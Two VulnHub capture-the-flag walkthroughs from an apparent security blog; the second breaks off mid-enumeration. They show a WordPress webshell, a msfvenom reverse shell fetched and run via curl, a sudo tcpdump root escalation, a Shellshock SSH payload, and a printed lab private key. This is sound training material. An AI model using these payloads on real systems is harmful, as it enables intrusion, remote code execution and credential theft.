<p>We proceed to perform a full TCP por scan with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> <span class="nt">-T4</span> <span class="nt">-Pn</span> 192.168.179.184 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>We do a service enumeration and script scanning on discovered open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 192.168.179.184 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 d2:ac:73:4c:17:ec:6a:82:79:87:5a:f9:22:d4:12:cb <span class="o">(</span>RSA<span class="o">)</span>
|   256 9c:d5:f3:2c:e2:d0:06:cc:8c:15:5a:5a:81:5b:03:3d <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 ab:67:56:69:27:ea:3e:3b:33:73:32:f8:ff:2e:1f:20 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-generator: WordPress 4.9.8
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Example site &amp;#8211<span class="p">;</span> Just another WordPress site
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>A wordpress web page is running on port 80, we need to enumerate more in detail about it.</p>

<p><img src="/assets/images/webdeveloper/screenshot-1.png" alt="" /></p>

<p>We run wpscan to discover vulnerable plugins and themes and list potencial users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wpscan <span class="nt">--url</span> http://192.168.179.184/ <span class="nt">--enumerate</span> vp,vt,u,dbe
...
<span class="o">[</span>+] Upload directory has listing enabled: http://192.168.179.184/wp-content/uploads/                                                                                
 | Found By: Direct Access <span class="o">(</span>Aggressive Detection<span class="o">)</span>                                                                                                                   
 | Confidence: 100% 
 ...
 <span class="o">[</span>+] webdeveloper
 | Found By: Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 | Confirmed By:
 |  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |   - http://192.168.179.184/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 ...
</code></pre></div></div>

<p>As we see, it was only possible to find a directory listing in the <strong>uploads</strong> directory and a user.</p>

<p>Then, a fast directory enumeration with dirb was found the <strong>ipdata</strong> directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirb http://192.168.179.184/ <span class="nt">-r</span>

<span class="nt">----</span> Scanning URL: http://192.168.179.184/ <span class="nt">----</span>                                                                                                                     
+ http://192.168.179.184/index.php <span class="o">(</span>CODE:301|SIZE:0<span class="o">)</span>                                                                                                                
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/ipdata/                                                                                                                       
+ http://192.168.179.184/server-status <span class="o">(</span>CODE:403|SIZE:303<span class="o">)</span>                                                                                                          
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-admin/                                                                                                                     
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-content/                                                                                                                   
<span class="o">==&gt;</span> DIRECTORY: http://192.168.179.184/wp-includes/                                                                                                                  
+ http://192.168.179.184/xmlrpc.php <span class="o">(</span>CODE:405|SIZE:42<span class="o">)</span>
</code></pre></div></div>

<p>It file contains the <strong>analyze.cap</strong> file.</p>

<p><img src="/assets/images/webdeveloper/screenshot-2.png" alt="" /></p>

<p>We download it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.184/ipdata/analyze.cap
</code></pre></div></div>

<p>We start wireshark.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wireshark <span class="o">&gt;</span>&amp;/dev/null &amp;
</code></pre></div></div>

<p>Then we click on a TCP package, right click and select <strong>follow TCP stream</strong>, and we see that the webdeveloper user has logged in to wordpress.</p>

<p><img src="/assets/images/webdeveloper/screenshot-3.png" alt="" /></p>

<p>We decode the password, so it is not readable.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>urlencode <span class="nt">-d</span> <span class="s1">'Te5eQg%264sBS%21Yr%24%29wf%25%28DcAd'</span>
Te5eQg&amp;4sBS!Yr<span class="nv">$)</span>wf%<span class="o">(</span>DcAd
</code></pre></div></div>

<p>We login as user <strong>webdeveloper</strong> and password <strong>Te5eQg&amp;4sBS!Yr$)wf%(DcAd</strong>.</p>

<p><img src="/assets/images/webdeveloper/screenshot-4.png" alt="" /></p>

<p><img src="/assets/images/webdeveloper/screenshot-5.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="wordpress">Wordpress</h3>

<p>This user has elevate permissions, so that we add a webshell to the plugin <strong>akismet.php</strong>.</p>

<p><img src="/assets/images/webdeveloper/screenshot-6.png" alt="" /></p>

<p>Then, we check that our php webshell is running successfully the <strong>id</strong> command.</p>

<p><img src="/assets/images/webdeveloper/screenshot-7.png" alt="" /></p>

<p>We list the system information and we detect that is a 64 bit operating system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'uname -a'</span><span class="si">)</span><span class="s2">"</span>
Linux webdeveloper 4.15.0-38-generic <span class="c">#41-Ubuntu SMP Wed Oct 10 10:59:38 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<p>We generate a linux 64 bit payload with msfvenom.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.179.1 <span class="nv">lport</span><span class="o">=</span>443 <span class="nt">-f</span> elf <span class="nt">-o</span> evil
</code></pre></div></div>

<p>We start a python web server on port 80.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 80
</code></pre></div></div>

<p>We set up a netcat listener on port 443, we run the following curl instruction that really do is download the paylod to the victim machine, give it execution permissions and execute it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.184/wp-content/plugins/akismet/akismet.php?cmd=</span><span class="si">$(</span>urlencode <span class="nt">-m</span> <span class="s1">'curl 192.168.179.1/evil -o /tmp/evil &amp;&amp; chmod +x /tmp/evil &amp;&amp; /tmp/evil'</span><span class="si">)</span><span class="s2">"</span>
</code></pre></div></div>
<p>If everything wen well, we get a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.184] 36790
script <span class="nt">-qc</span> /bin/bash /dev/null
www-data@webdeveloper:/var/www/html/wp-content/plugins/akismet<span class="err">$</span>
</code></pre></div></div>

<p>Listing the wordpress config file was found the password of mysql connection.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webdeveloper:/var/www/html<span class="nv">$ </span><span class="nb">head</span> <span class="nt">-n</span> 40 wp-config.php
...
// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'wordpress'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'webdeveloper'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'MasterOfTheUniverse'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
define<span class="o">(</span><span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span><span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
define('</span>DB_COLLATE<span class="s1">', '');
...
</span></code></pre></div></div>

<p>I tried to re-use the password <strong>MasterOfTheUniverse</strong> to log in as the user webdeveloper.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@webdeveloper:/var/www/html<span class="nv">$ </span>su - webdeveloper
su - webdeveloper
Password: MasterOfTheUniverse

webdeveloper@webdeveloper:~<span class="err">$</span>
</code></pre></div></div>

<p>We can run the tcpdump tool with sudo permissions, a way to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webdeveloper@webdeveloper:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>webdeveloper: MasterOfTheUniverse

Matching Defaults entries <span class="k">for </span>webdeveloper on webdeveloper:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User webdeveloper may run the following commands on webdeveloper:
    <span class="o">(</span>root<span class="o">)</span> /usr/sbin/tcpdump
webdeveloper@webdeveloper:~<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>We will reuse the payload generated before, set up a netcat listener on port 443, and we execute the following tcpdump command that will execute our payload as user root, this topic was extracted from <a href="https://gtfobins.github.io/gtfobins/tcpdump">GTFOBINS</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>webdeveloper@webdeveloper:~<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/evil <span class="nt">-Z</span> root
</code></pre></div></div>

<p>And finally we have a shell with root permissions, and read the flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.184] 39914
script <span class="nt">-qc</span> /bin/bash /dev/null
root@webdeveloper:/home/webdeveloper#
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@webdeveloper:/home/webdeveloper# <span class="nb">cd</span> /root
<span class="nb">cd</span> /root
root@webdeveloper:/root# <span class="nb">ls 
ls 
</span>flag.txt
root@webdeveloper:/root# <span class="nb">cat </span>flag.txt
<span class="nb">cat </span>flag.txt
Congratulations here is youre flag:
cba045a5a4f26f1cd8d7be9a5c2b1b34f6c5d290
root@webdeveloper:/root#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Tr0ll 2</h1>
	<p class="post-date text-bold text-upcase">
	<span>December 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present.</p>

<p><strong>Author:</strong> Maleus</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To gain root and get Proof.txt from the /root directory.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/tr0ll-2,107/">https://www.vulnhub.com/entry/tr0ll-2,107/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping scan discovered the target host on the local network, the script can be downloaded <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hdiscovery.py <span class="nt">-r</span> 192.168.179.0/24
192.168.179.183 <span class="o">=&gt;</span> up
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>The full TCP port scan with nmap detected three open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.183 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Service detection and script scanning were performed against the target host to get more information about open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p21</span>,22,80 192.168.179.183 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 82:fe:93:b8:fb:38:a6:77:b5:a6:25:78:6b:35:e2:a8 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 7d:a5:99:b8:fb:67:65:c9:64:86:aa:2c:d6:ca:08:5d <span class="o">(</span>RSA<span class="o">)</span>
|_  256 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp open  http    Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
...
</span></code></pre></div></div>

<h3 id="ftp-enumeration">FTP Enumeration</h3>

<p>After few attempts I logged in with Tr0ll as username and password through the browser.</p>

<p><img src="/assets/images/tr0ll2/screenshot-1.png" alt="" /></p>

<p>There is a zip file, we download it.</p>

<p><img src="/assets/images/tr0ll2/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/tr0ll2/screenshot-3.png" alt="" /></p>

<p>At the time to decompress this asks a password, the same that we don’t know.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>unzip lmao.zip 
Archive:  lmao.zip
<span class="o">[</span>lmao.zip] noob password: 
password incorrect--reenter: 
password incorrect--reenter: 
   skipping: noob                    incorrect password
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Browsing the home page this only contains an image.</p>

<p><img src="/assets/images/tr0ll2/screenshot-4.png" alt="" /></p>

<p>By listing the robots.txt file, a list of possible web directories was discovery.</p>

<p><img src="/assets/images/tr0ll2/screenshot-5.png" alt="" /></p>

<p>We download and copy the directory names to a file on the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> http://192.168.179.183/robots.txt | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 2 | <span class="nb">tail</span> <span class="nt">-n</span> +3 <span class="o">&gt;</span> dirs.txt
</code></pre></div></div>

<p>Then, we try to brute force with dirsearch to discover existing directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://192.168.179.183/ <span class="nt">-w</span> /root/tr0ll2/dirs.txt
...
<span class="o">[</span>21:49:06] 301 -  317B  - /noob  -&gt;  http://192.168.179.183/noob/
<span class="o">[</span>21:49:06] 301 -  324B  - /keep_trying  -&gt;  http://192.168.179.183/keep_trying/
<span class="o">[</span>21:49:06] 301 -  324B  - /dont_bother  -&gt;  http://192.168.179.183/dont_bother/
<span class="o">[</span>21:49:06] 301 -  326B  - /ok_this_is_it  -&gt;  http://192.168.179.183/ok_this_is_it/
...
</code></pre></div></div>

<p>In the output we can see that the tool found four directories, but these contain the same image as shown below.</p>

<p><img src="/assets/images/tr0ll2/screenshot-6.png" alt="" /></p>

<p><img src="/assets/images/tr0ll2/screenshot-7.png" alt="" /></p>

<p><img src="/assets/images/tr0ll2/screenshot-8.png" alt="" /></p>

<p><img src="/assets/images/tr0ll2/screenshot-9.png" alt="" /></p>

<p>We need to download the images, possibly these contain some valuable information, we save the directories found in a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"noob</span><span class="se">\n</span><span class="s2">keep_trying</span><span class="se">\n</span><span class="s2">dont_bother</span><span class="se">\n</span><span class="s2">ok_this_is_it"</span> <span class="o">&gt;</span> img-dirs.txt
</code></pre></div></div>

<p>I have written a bash script to automatically download the images.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">host</span><span class="o">=</span><span class="s2">"http://192.168.179.183"</span>

<span class="k">function </span>download<span class="o">(){</span>
	<span class="nv">c</span><span class="o">=</span>1
	<span class="k">while </span><span class="nb">read dirs</span><span class="p">;</span> <span class="k">do
		</span><span class="nv">img</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-L</span> <span class="nv">$host</span>/<span class="nv">$dirs</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"'.*'"</span> | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"'"</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
		<span class="nb">echo</span> <span class="s2">"Downloading image</span><span class="nv">$c</span><span class="s2">.jpg"</span>
		<span class="nb">sleep </span>1
		wget <span class="nt">-q</span> <span class="s2">"</span><span class="nv">$host</span><span class="s2">/</span><span class="nv">$dirs</span><span class="s2">/</span><span class="nv">$img</span><span class="s2">"</span> <span class="nt">-O</span> images/image<span class="nv">$c</span>.jpg
		<span class="nv">c</span><span class="o">=</span><span class="k">$((</span>c+1<span class="k">))</span>	
	<span class="k">done</span> &lt; img-dirs.txt
	<span class="nb">echo</span> <span class="s2">"Done."</span>
<span class="o">}</span>

<span class="k">if</span> <span class="o">[[</span> <span class="nt">-d</span> images <span class="o">]]</span><span class="p">;</span> <span class="k">then
	</span>download
<span class="k">else
	</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"Creating directory.."</span>
	<span class="nb">sleep </span>1
	<span class="nb">mkdir </span>images
	download
<span class="k">fi</span>
</code></pre></div></div>

<p>We run the script, the images will be download into a directory called images.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>bash download-img.sh
Creating directory..
Downloading image1.jpg
Downloading image2.jpg
Downloading image3.jpg
Downloading image4.jpg
Done.
</code></pre></div></div>

<p>Analyzing the images with the <strong>strings</strong> utility, the image number three contains a message at the end of the content.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">ls </span>images | <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"Analyzing </span><span class="nv">$line</span><span class="s2">"</span><span class="p">;</span> <span class="nb">sleep </span>2<span class="p">;</span> strings images/<span class="nv">$line</span> | less<span class="p">;</span> <span class="k">done

</span>root@kali:~<span class="nv">$ </span>strings images/image3.jpg | <span class="nb">tail</span> <span class="nt">-1</span>
Look Deep within y0ur_self <span class="k">for </span>the answer
</code></pre></div></div>

<p>We use the browser to search the content in the <strong>y0ur_self</strong> directory.</p>

<p><img src="/assets/images/tr0ll2/screenshot-10.png" alt="" /></p>

<p>As we can see the answer.txt file contains a large list of words in base64.</p>

<p><img src="/assets/images/tr0ll2/screenshot-11.png" alt="" /></p>

<p>We decode the words in base64 and save them to a file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>curl <span class="nt">-s</span> <span class="s2">"http://192.168.179.183/y0ur_self/answer.txt"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">sort</span> <span class="nt">-u</span> <span class="o">&gt;</span> b64decode.txt
</code></pre></div></div>

<p>We crack the zip file with fcrackzip using the decoded words in base64.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>fcrackzip <span class="nt">-u</span> <span class="nt">-D</span> <span class="nt">-p</span> b64decode.txt lmao.zip  


PASSWORD FOUND!!!!: pw <span class="o">==</span> ItCantReallyBeThisEasyRightLOL
</code></pre></div></div>

<p>We unzip the <strong>lmao.zip</strong> file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>unzip lmao.zip
Archive:  lmao.zip
<span class="o">[</span>lmao.zip] noob password: 
  inflating: noob
</code></pre></div></div>

<p>The <strong>noob</strong> file contains a private key, we can login with this via SSH.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>noob 
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
<span class="nv">zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g</span><span class="o">==</span>
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>We login through SSH as user noob, but we don’t have a shell, the server closes us the connection.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183
TRY HARDER LOL!
Connection to 192.168.179.183 closed.
</code></pre></div></div>

<p>As is an old version of SSH is possible that this ubuntu version to be vulnerable to shellshock.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183 <span class="s1">'() { :;}; echo hello;id'</span>
hello
<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>noob<span class="o">)</span>
</code></pre></div></div>

<p>As we saw earlier, it is vulnerable to shellshock and we can bypass the system restriction and execute commands.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-i</span> noob <span class="nt">-l</span> noob 192.168.179.183 <span class="s1">'() { :;}; echo hello;bash -i'</span>
hello
bash: no job control <span class="k">in </span>this shell
noob@Tr0ll2:~<span class="err">$</span>
</code></pre></div></div>

<p>Listing the SUID binaries three suspect files were found.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-la</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
...
<span class="nt">-rwsr-xr-x</span> 1 root root 7271 Oct  4  2014 /nothing_to_see_here/choose_wisely/door2/r00t
<span class="nt">-rwsr-xr-x</span> 1 root root 7273 Oct  5  2014 /nothing_to_see_here/choose_wisely/door3/r00t
<span class="nt">-rwsr-xr-x</span> 1 root root 8401 Oct  5  2014 /nothing_to_see_here/choose_wisely/door1/r00t
</code></pre></div></div>

<p>We see three files, perhaps a means of privilege escalation via buffer overflow.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>noob@Tr0ll2:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /nothing_to_see_here/choose_wisely/<span class="k">*</span>         
<span class="nb">ls</span> <span class="nt">-la</span> /nothing_to_see_here/choose_wisely/<span class="k">*</span>
/nothing_to_see_here/choose_wisely/door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4  2014 <span class="nb">.</span>
drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
<span class="nt">-rwsr-xr-x</span> 1 root root 7271 Oct  4  2014 r00t

